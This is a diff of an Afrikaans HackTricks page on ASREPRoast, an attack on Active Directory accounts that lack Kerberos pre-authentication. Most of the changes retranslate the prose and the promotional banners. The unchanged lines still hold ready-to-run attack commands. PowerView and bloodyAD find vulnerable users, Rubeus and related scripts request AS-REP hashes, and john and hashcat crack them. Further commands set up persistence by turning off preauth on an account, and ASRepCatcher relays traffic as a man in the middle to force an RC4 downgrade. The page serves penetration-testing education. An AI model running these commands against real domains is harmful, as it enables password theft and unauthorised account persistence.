@@ -1,47 +1,48 @@
 # ASREPRoast
 
+{% hint style="success" %}
+Leer & oefen AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Leer & oefen GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+
 <details>
 
-<summary><strong>Leer AWS-hacking vanaf nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary>Ondersteun HackTricks</summary>
 
-Ander maniere om HackTricks te ondersteun:
-
-* As jy jou **maatskappy geadverteer wil sien in HackTricks** of **HackTricks in PDF wil aflaai** Kyk na die [**INSKRYWINGSPLANNE**](https://github.com/sponsors/carlospolop)!
-* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* Ontdek [**Die PEASS Familie**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
-* **Sluit aan by die** 💬 [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
-* **Deel jou haktruuks deur PRs in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-opslag.
+* Kyk na die [**subskripsie planne**](https://github.com/sponsors/carlospolop)!
+* **Sluit aan by die** 💬 [**Discord groep**](https://discord.gg/hRep4RUj7f) of die [**telegram groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Deel hacking truuks deur PR's in te dien na die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
 </details>
+{% endhint %}
 
 <figure><img src="../../.gitbook/assets/image (380).png" alt=""><figcaption></figcaption></figure>
 
-Sluit aan by [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) bediener om met ervare hackers en foutbeloningsjagters te kommunikeer!
+Sluit aan by [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) bediener om te kommunikeer met ervare hackers en bug bounty jagters!
 
-**Hacking-insigte**\
-Raak betrokke by inhoud wat die opwinding en uitdagings van hack bevat
+**Hacking Inligting**\
+Betrek met inhoud wat die opwinding en uitdagings van hacking ondersoek
 
-**Haknuus in Werklikheid**\
-Bly op hoogte van die snelveranderende hackwêreld deur werklikheidsnuus en insigte
+**Regte-Tyd Hack Nuus**\
+Bly op hoogte van die vinnige hacking wêreld deur regte-tyd nuus en insigte
 
-**Nuutste Aankondigings**\
-Bly ingelig met die nuutste foutbelonings wat bekendgestel word en kritieke platformopdaterings
+**Laaste Aankondigings**\
+Bly ingelig oor die nuutste bug bounties wat bekendgestel word en belangrike platform opdaterings
 
 **Sluit by ons aan op** [**Discord**](https://discord.com/invite/N3FrSbmwdy) en begin vandag saamwerk met top hackers!
 
 ## ASREPRoast
 
-ASREPRoast is 'n sekuriteitsaanval wat gebruikers aanval wat die **Kerberos-voorafverifikasie vereiste kenmerk** ontbreek. Hierdie kwesbaarheid maak dit essensieel vir aanvallers om verifikasie vir 'n gebruiker van die Domeinbeheerder (DC) aan te vra sonder om die gebruiker se wagwoord nodig te hê. Die DC reageer dan met 'n boodskap wat versleutel is met die gebruiker se wagwoord-afgeleide sleutel, wat aanvallers kan probeer kraak om die gebruiker se wagwoord te ontdek.
+ASREPRoast is 'n sekuriteitsaanval wat gebruikers teiken wat die **Kerberos voor-sertifisering vereiste attribuut** ontbreek. Essensieel laat hierdie kwesbaarheid aanvallers toe om sertifisering vir 'n gebruiker van die Domeinbeheerder (DC) aan te vra sonder om die gebruiker se wagwoord te benodig. Die DC antwoord dan met 'n boodskap wat geënkripteer is met die gebruiker se wagwoord-afgeleide sleutel, wat aanvallers kan probeer om offline te kraak om die gebruiker se wagwoord te ontdek.
 
 Die hoofvereistes vir hierdie aanval is:
 
-* **Gebrek aan Kerberos-voorafverifikasie**: Teikengebruikers moet hierdie sekuriteitsfunksie nie geaktiveer hê nie.
-* **Koppeling met die Domeinbeheerder (DC)**: Aanvallers het toegang tot die DC nodig om versoek te stuur en versleutelde boodskappe te ontvang.
-* **Opsionele domeinrekening**: Die besit van 'n domeinrekening stel aanvallers in staat om kwesbare gebruikers meer doeltreffend te identifiseer deur LDAP-navrae. Sonder so 'n rekening moet aanvallers gebruikersname raai.
+* **Ontbreking van Kerberos voor-sertifisering**: Teiken gebruikers moet nie hierdie sekuriteitskenmerk geaktiveer hê nie.
+* **Verbintenis met die Domeinbeheerder (DC)**: Aanvallers het toegang tot die DC nodig om versoeke te stuur en geënkripteerde boodskappe te ontvang.
+* **Opsionele domeinrekening**: Om 'n domeinrekening te hê, laat aanvallers toe om kwesbare gebruikers meer doeltreffend te identifiseer deur LDAP-navrae. Sonder so 'n rekening moet aanvallers gebruikersname raai.
 
-#### Identifisering van kwesbare gebruikers (benodig domeinlegitimasie)
+#### Enumerering van kwesbare gebruikers (het domein kredensiale nodig)
 
-{% code title="Gebruik van Windows" %}
+{% code title="Using Windows" %}
 ```bash
 Get-DomainUser -PreauthNotRequired -verbose #List vuln users using PowerView
 ```
@@ -51,7 +52,9 @@ Get-DomainUser -PreauthNotRequired -verbose #List vuln users using PowerView
 ```bash
 bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 get search --filter '(&(userAccountControl:1.2.840.113556.1.4.803:=4194304)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))' --attr sAMAccountName
 ```
-#### Versoek AS_REP-boodskap
+{% endcode %}
+
+#### Versoek AS\_REP boodskap
 
 {% code title="Gebruik Linux" %}
 ```bash
@@ -70,19 +73,19 @@ Get-ASREPHash -Username VPN114user -verbose #From ASREPRoast.ps1 (https://github
 {% endcode %}
 
 {% hint style="warning" %}
-AS-REP Roasting met Rubeus sal 'n 4768 genereer met 'n enkripsie tipe van 0x17 en voorafgoedkeuring tipe van 0.
+AS-REP Roasting met Rubeus sal 'n 4768 genereer met 'n versleutelingstipe van 0x17 en 'n preauth-tipe van 0.
 {% endhint %}
 
-### Kraak
+### Kraking
 ```bash
 john --wordlist=passwords_kerb.txt hashes.asreproast
 hashcat -m 18200 --force -a 0 hashes.asreproast passwords_kerb.txt
 ```
 ### Volharding
 
-Dwing **preauth** nie vereis vir 'n gebruiker waar jy **GenericAll** toestemmings het (of toestemmings om eienskappe te skryf):
+Force **preauth** nie vereis vir 'n gebruiker waar jy **GenericAll** toestemmings het (of toestemmings om eienskappe te skryf):
 
-{% code title="Gebruik van Windows" %}
+{% code title="Using Windows" %}
 ```bash
 Set-DomainObject -Identity <username> -XOR @{useraccountcontrol=4194304} -Verbose
 ```
@@ -96,8 +99,8 @@ bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 add uac 
 
 ## ASREProast sonder geloofsbriewe
 
-'n Aanvaller kan 'n man-in-die-middel-posisie gebruik om AS-REP-pakkette vas te vang terwyl hulle die netwerk deurloop sonder om te staat te wees op Kerberos-voorafverifikasie wat uitgeskakel is. Dit werk dus vir alle gebruikers op die VLAN.\
-[ASRepCatcher](https://github.com/Yaxxine7/ASRepCatcher) stel ons in staat om dit te doen. Verder dwing die gereedskap klientewerkstasies om RC4 te gebruik deur die Kerberos-onderhandeling te verander.
+'n Aanvaller kan 'n man-in-the-middle posisie gebruik om AS-REP pakkette te vang terwyl hulle deur die netwerk beweeg sonder om op Kerberos voor-outekenning staat te maak. Dit werk dus vir alle gebruikers op die VLAN.\
+[ASRepCatcher](https://github.com/Yaxxine7/ASRepCatcher) laat ons dit doen. Boonop dwing die hulpmiddel kliënt werkstasies om RC4 te gebruik deur die Kerberos onderhandeling te verander.
 ```bash
 # Actively acting as a proxy between the clients and the DC, forcing RC4 downgrade if supported
 ASRepCatcher relay -dc $DC_IP
@@ -116,29 +119,30 @@ ASRepCatcher listen
 
 <figure><img src="../../.gitbook/assets/image (380).png" alt=""><figcaption></figcaption></figure>
 
-Sluit aan by [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) bediener om met ervare hackers en foutbeloningsjagters te kommunikeer!
+Sluit aan by [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) bediener om met ervare hackers en bug bounty jagters te kommunikeer!
 
-**Hack-insigte**\
-Gaan in gesprek met inhoud wat die opwinding en uitdagings van hack bekyk
+**Hacking Inligting**\
+Betrek met inhoud wat die opwinding en uitdagings van hacking ondersoek
 
-**Hack Nuus in Werklikheid**\
-Bly op hoogte van die snelbewegende hackwêreld deur werklikheidsnuus en insigte
+**Regte Tyd Hack Nuus**\
+Bly op hoogte van die vinnig bewegende hacking wêreld deur middel van regte tyd nuus en insigte
 
-**Nuutste Aankondigings**\
-Bly ingelig met die nuutste foutbelonings wat bekendgestel word en kritieke platformopdaterings
+**Laaste Aankondigings**\
+Bly ingelig oor die nuutste bug bounties wat bekendgestel word en belangrike platform opdaterings
 
 **Sluit by ons aan op** [**Discord**](https://discord.com/invite/N3FrSbmwdy) en begin vandag saamwerk met top hackers!
 
+{% hint style="success" %}
+Leer & oefen AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Leer & oefen GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+
 <details>
 
-<summary><strong>Leer AWS-hacking vanaf nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary>Ondersteun HackTricks</summary>
 
-Ander maniere om HackTricks te ondersteun:
-
-* As jy wil sien dat jou **maatskappy geadverteer word in HackTricks** of **HackTricks aflaai in PDF-formaat** Kyk na die [**INSKRYWINGSPLANNE**](https://github.com/sponsors/carlospolop)!
-* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* Ontdek [**Die PEASS Familie**](https://opensea.io/collection/the-peass-family), ons versameling van eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
-* **Sluit aan by die** 💬 [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
-* **Deel jou hack-truuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-opslag. 
+* Kyk na die [**subskripsie planne**](https://github.com/sponsors/carlospolop)!
+* **Sluit aan by die** 💬 [**Discord groep**](https://discord.gg/hRep4RUj7f) of die [**telegram groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Deel hacking truuks deur PRs in te dien na die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
 </details>
+{% endhint %}
